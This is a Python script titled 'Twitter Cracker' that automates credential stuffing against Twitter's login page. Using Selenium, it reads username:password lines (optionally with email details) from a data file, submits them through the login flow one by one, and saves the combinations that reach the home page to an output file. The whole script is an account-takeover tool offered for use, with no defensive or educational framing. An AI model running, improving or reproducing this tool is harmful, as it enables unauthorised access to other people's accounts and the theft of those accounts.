
# ********************************************************
# *                                                     *
# *         Author: ARMAGRAMER | Twitter Cracker         *
# *                                                     *
# *******************************************************

#? Libraries
import os
import time

try:
    from selenium.common.exceptions import WebDriverException
    from selenium import webdriver
except ImportError:
    print("Installing SELENIUM...")
    os.system('python -m pip install selenium')

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    print("Installing WEB DRIVER MANAGER...")
    os.system('python -m pip install webdriver-manager')

from selenium.common.exceptions import WebDriverException
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager

###############################################################################

#! Webdriver address
Driver_Address = "chromedriver.exe"

#! Site address
Site = "https://twitter.com/i/flow/login"       #! Twiite Login Page
Home = "https://twitter.com/home"

#! Site elements
Username_Box = "text"
Password_Box = "password"
Phonenumber_Box = "text"
Next_Button = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div[6]/div'
Login_Button = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[2]/div/div/div/div/div'


#! Basic data
File_Addres = "final_data.txt" #! File name must be "Final_Addres"
Username = ""
Password = ""
Phone = ""
Data_Status = 0

while True:
    try:

        try:

            #! Driver option
            Option = webdriver.ChromeOptions()
            Driver = webdriver.Chrome(Driver_Address)
            Driver.get(Site)

        except WebDriverException:

            #! Update webdriver
            Driver_Manager = ChromeDriverManager(path=Driver_Address)
            webdriver.Chrome(ChromeDriverManager().install())

        #? Open and read data file
        with open(File_Addres, "r") as File:
        
            #? Loop in data lines and read them
            for line in File:

                #! Read data from file
                Data = line.strip().split(":")

                #! 4 data (username, password, email/phone, email pass)
                if len(Data)==4:

                    Username = Data[0]
                    Password = Data[1]
                    Email = Data[2]
                    Email_Password = Data[3]
                    Data_Status = 4
                    print(f"Username : {Username}, Password : {Password}, Email{Email}, Password{Email_Password}")
                
                #! 3 data (username, password, email/phone)
                elif len(Data)==3:

                    Username = Data[0]
                    Password = Data[1]
                    Email = Data[2]
                    Data_Status = 3
                    print(f"Username : {Username}, Password : {Password}, Email{Email}")

                #! 2 data (username, password)
                elif len(Data)==2:

                    Username = Data[0]
                    Password = Data[1]
                    Data_Status = 2
                    print(f"Username : {Username}, Password : {Password}")
                
                #? Delete current line
                Lines = File.readlines()
                for Line in Lines:
                    with open(File_Addres, "w") as Delete:
                        Delete.writelines(Lines[0:])
                    break
                break
                
                                              
        #? Send username to username box
        try:
            time.sleep(5)
            Username_Box_Founded = Driver.find_element("name", Username_Box)
            Username_Box_Founded.send_keys(Username)
        except:
            print("Can't find username box")
            Driver.close()


        #? Click on next button(Username)
        try:
            Next_BTN = Driver.find_element("xpath", Next_Button)
            Next_BTN.click()
            time.sleep(3)
        except:
            print("Can't find next button")
            Driver.close()

        #? Send Password to username box
        try:
            Password_Box_Founded = Driver.find_element("name", Password_Box)
            Password_Box_Founded.send_keys(Password)
            time.sleep(3)
        except:
            print("Can't find password box")
            Driver.close()

        #? Click on next button(Password)
        try:
            Login_BTN = Driver.find_element("xpath", Login_Button)
            Login_BTN.click()
            time.sleep(3)
        except:
            print("Can't find login button")
            Driver.close()

        #? Send phonenumber to phone box
        try:
            Phone_Box_Founded = Driver.find_element("name", Phonenumber_Box)
            Phone_Box_Founded.send_keys(Phone)
            time.sleep(3)
        except:
            print("Can't find phonenumber box")
            Driver.close()

        #? Click on next button(Password)
        try:
            Login_BTN = Driver.find_element("xpath", Login_Button)
            Login_BTN.click()
            time.sleep(3)
        except:
            print("Can't find login button")
            Driver.close()
        
            
        #! Write currect username & password in output file 
        if Driver.current_url == Home :
            with open("Output.txt", "a") as Output:
                Output.write(f"{Username}:{Password}")
                Output.write("\n")
                Driver.quit()

    except Exception:
        print(Exception)          
